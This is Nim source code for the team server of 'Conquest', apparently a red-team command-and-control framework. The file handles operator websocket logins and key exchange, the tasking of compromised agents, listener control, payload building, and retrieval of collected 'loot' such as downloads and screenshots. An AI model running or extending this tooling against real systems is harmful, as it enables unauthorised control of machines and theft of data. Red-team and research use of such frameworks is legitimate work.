import mummy, mummy/routers
import terminal, json, math, base64, times, os
import strutils, strformat, system, tables

import ./globals
import ./db/database
import ./core/[listener, logger, builder, websocket, auth]
import ../common/[crypto, utils, profile, event]
import ../types/[common, event, protocol, server]

proc header() = 
    echo ""
    echo "┏┏┓┏┓┏┓┓┏┏┓┏╋"
    echo "┗┗┛┛┗┗┫┗┻┗ ┛┗ V0.2"
    echo "      ┗  @jakobfriedl"  
    echo "─".repeat(21) 
    echo ""

proc init*(T: type Conquest, profileString, privateKey, logDir, lootDir: string): Conquest = 
    var cq = new Conquest
    cq.listeners = initTable[string, Listener]()
    cq.agents = initTable[string, Agent]() 
    cq.profileString = profileString
    cq.profile = parseString(profileString)
    cq.keyPair = loadKeyPair(privateKey)
    cq.logDir = logDir
    cq.lootDir = lootDir
    cq.clients = initTable[string, WsConnection]() 
    return cq

#[
    WebSocket
]#
proc upgradeHandler(request: Request) = 
    {.cast(gcsafe).}:
        let ws = request.upgradeToWebSocket()
        let clientId = generateUuid()
        cq.clients[clientId] = WsConnection(
            clientId: clientId,
            ws: ws
        )

proc websocketHandler(ws: WebSocket, event: WebSocketEvent, message: Message) {.gcsafe.} = 
    {.cast(gcsafe).}:
        
        # Get requesting clientId
        var clientId: string = ""
        for id, conn in cq.clients: 
            if conn.ws == ws: 
                clientId = conn.clientId
                break

        case event:
        of OpenEvent:
            # New client connected to team server
            # Send the public key for the key exchange, all other information with be transmitted when the key exchange is completed
            cq.sendPublicKey(cq.keyPair.publicKey, clientId = clientId)
    
        of MessageEvent:            
            let event = message.recvEvent(cq.clients[clientId].sessionKey)
            case event.eventType: 
            of CLIENT_KEY_EXCHANGE: 
                let publicKey = decode(event.data["publicKey"].getStr()).toKey()
                cq.clients[clientId].sessionKey = deriveSessionKey(cq.keyPair, publicKey)
            
            of CLIENT_AUTH:
                let username = event.data["username"].getStr()
                let password = event.data["password"].getStr()

                # Authenticate user 
                let auth = cq.authenticate(username, password)
                cq.sendAuthenticationResult(auth, clientId = clientId)

                if auth: 
                    cq.clients[clientId].user = username
                    cq.sendEventlogItem(LOG_SUCCESS_SHORT, fmt"User {username} connected.")

            of CLIENT_SYNC:
                # Synchronize data between client and server (after client authentication)
                # C2 profile 
                cq.sendProfile(cq.profileString, clientId = clientId)
                
                # Listeners
                for id, listener in cq.listeners: 
                    cq.sendListener(listener, clientId = clientId)
                
                # Agent sessions
                for id, agent in cq.agents: 
                    cq.sendAgent(agent, clientId = clientId)

                # Downloads & Screenshots metadata
                for lootItem in cq.dbGetLoot():
                    cq.sendLoot(lootItem, clientId = clientId)

            of CLIENT_AGENT_TASK:
                let 
                    agentId = event.data["agentId"].getStr()
                    task = event.data["task"].to(Task) 
                    command = event.data["command"].getStr()
                    message = event.data["message"].getStr()
                
                cq.agents[agentId].tasks.add(task)
                cq.agents[agentId].taskCommands[task.taskId] = command.split(" ")[0]
                cq.sendConsoleItem(agentId, LOG_COMMAND, command)
                cq.sendConsoleItem(agentId, LOG_INFO, message)

            of CLIENT_LISTENER_START:
                let listener = event.data.to(UIListener)
                cq.listenerStart(listener)
            
            of CLIENT_LISTENER_STOP:
                let listenerId = event.data["listenerId"].getStr()
                cq.listenerStop(listenerId)

            of CLIENT_AGENT_BUILD:
                let agentBuildInformation = event.data.to(AgentBuildInformation)
                let (name, payload) = cq.agentBuild(agentBuildInformation, clientId = clientId)
                if payload.len() != 0: 
                    cq.sendAgentPayload(name, payload, clientId = clientId)

            of CLIENT_AGENT_REMOVE: 
                let agentId = event.data["agentId"].getStr()
                cq.dbDeleteAgentById(agentId)

            of CLIENT_LOOT_REMOVE: 
                if not cq.dbDeleteLootById(event.data["lootId"].getStr()): 
                    cq.sendEventlogItem(LOG_ERROR, "Failed to delete loot.")

            of CLIENT_LOOT_GET: 
                let loot = cq.dbGetLootById(event.data["lootId"].getStr())
                cq.sendLootData(loot, readFile(loot.path), clientId = clientId)

            of CLIENT_LOG: 
                log(event.data["message"].getStr(), event.data["agentId"].getStr())

            of CLIENT_CHAT: 
                cq.sendChatMessage(event.data["user"].getStr(), event.data["message"].getStr())

            else: discard

        of ErrorEvent:
            discard 
            
        of CloseEvent:
            let user = cq.clients[clientId].user
            cq.clients.del(clientId)
            cq.sendEventlogItem(LOG_ERROR_SHORT, fmt"User {user} disconnected.")

var lastCtrlCTime = fromUnix(0)
var ctrlC = 0

proc handleCtrlC() {.noconv.} =
    let now = getTime()
    if now - lastCtrlCTime > initDuration(seconds = 2):
        ctrlC = 0
    
    inc ctrlC
    lastCtrlCTime = now
    
    if ctrlC == 1:
        echo "\nPress Ctrl+C again to exit."
    else:
        echo "\nExiting."
        quit(0)

proc startServer*(
        profile: string, 
        key: string = CONQUEST_ROOT / "data/keys/conquest-server_x25519_private.key", 
        db: string = CONQUEST_ROOT / "data/conquest.db",
        log_dir: string = CONQUEST_ROOT / "data/logs",
        loot_dir: string = CONQUEST_ROOT / "data/loot"
    ) =

    # Handle team server exit
    setControlCHook(handleCtrlC)

    header()
    
    try:
        # Initialize framework context
        let profileString = readFile(profile)
        cq = Conquest.init(profileString, key, log_dir, loot_dir)

        cq.info("Using profile \"", cq.profile.getString("name"), "\" (", profile ,").")
        
        # Initialize database
        cq.dbInit(db)
        cq.dbGetAllAgents()

        # Initialize listener error channel
        openErrorChannel()

        # Restart existing listeners
        for listener in cq.dbGetAllListeners():
            cq.listenerStart(listener)  

        # Start websocket server
        var router: Router
        router.get("/*", upgradeHandler)
        
        # Increased websocket message length in order to support dotnet assembly execution (1GB)
        let server = newServer(router, websocketHandler, maxBodyLen = 1024 * 1024 * 1024, maxMessageLen = 1024 * 1024 * 1024)
        server.serve(Port(cq.profile.getInt("team-server.port")), cq.profile.getString("team-server.host"))

    except CatchableError as err:
        echo err.msg
        quit(0)
    
# Conquest framework entry point
when isMainModule:
    import cligen
    dispatch startServer,
        cmdName = "server",
        usage = "$command [options] \n\nOptions:\n$options\n",
        short = { "profile": 'p', "key": 'k', "db": 'd', "log_dir": 'l', "loot_dir": 'L' },
        help  = {
            "profile":  "Path to the Conquest C2 profile (.toml)",
            "key":      "Path to the X25519 private key file.",
            "db":       "Path to the team server database.",
            "log_dir":  "Path to the log directory.",
            "loot_dir": "Path to the loot directory."
        }